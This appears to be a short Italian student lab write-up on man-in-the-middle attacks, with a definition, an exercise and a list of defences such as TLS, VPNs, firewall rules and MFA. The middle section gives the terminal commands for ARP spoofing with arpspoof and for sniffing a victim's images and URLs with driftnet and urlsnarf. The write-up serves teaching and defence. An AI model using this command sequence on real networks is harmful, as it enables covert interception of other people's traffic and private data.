Dettagli Progetto

Un attacco man-in-the-midle (MITM) avviene quando un hacker maligno si mette in mezzo alla comunicazione tra dispositivi, quali possono essere server e un host della rete. L'hacker manipola la comunicazione, intercetta dati oppure li modifica senza che le due parti se ne accorgano. Per garantire una protezione adeguata, è fondamentale adottare protocolli crittografici come SSL/TLS e metodi di autenticazione affidabili.

Esercitazione

Si sono utilizzati diversi comandi da terminale :

$ sysctl -w net.ipv4.ip_forward=1

Che serve per serve per inoltrare tutti i pacchetti di rete IPv4, in questo modo il pc fungerà da Router

$ arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]

Questo serve a indicare alla macchina vitima che noi siamo il router ossia il default gateway

$ arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]

Con questo comando serve a dire al router che noi siamo la macchina vittima

Per sniffare le immagini della macchina vittima si procede con l'utilzare ils eguente comando

$ driftnet -i [Network Interface Name]

Per sniffare sugli URL di navigazione della macchina vittima si utilizza il seguente comando

$ urlsnarf -i [Network Interface Name]

Metodi di difesa

■Utilizzare protocolli crittografici come SSL/TLS ■Utilizzare connessioni VPN in modo da creare un tunnel crittografato tra il dispositivo dell'utente e il server di destinazione ■Configurare il firewall in modo tale che blocchi il traffico ARP sospetto ■Utilizzare metodi di autenticazione a più fattori ■Mantenere il software aggiornato
